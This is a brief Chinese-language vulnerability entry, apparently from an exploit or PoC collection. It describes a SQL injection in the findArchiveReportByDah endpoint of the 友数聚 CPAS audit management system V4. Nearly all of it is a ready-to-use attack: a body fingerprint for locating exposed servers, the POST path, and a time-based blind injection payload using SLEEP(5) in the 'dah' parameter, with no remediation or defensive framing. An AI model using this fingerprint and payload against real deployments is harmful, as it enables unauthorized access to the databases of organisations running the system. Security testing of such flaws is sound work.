# 友数聚CPAS审计管理系统V4findArchiveReportByDah存在SQL注入漏洞

友数聚CPAS审计管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/cpasm4/static/cap/font/iconfont.css"`
- **请求**：`POST /cpasm4/cpasList/findArchiveReportByDah HTTP/1.1`

**Payload**
```
dah=1' AND (SELECT * FROM (SELECT(SLEEP(5)))x) AND '1'='1
```
- **响应特征**：200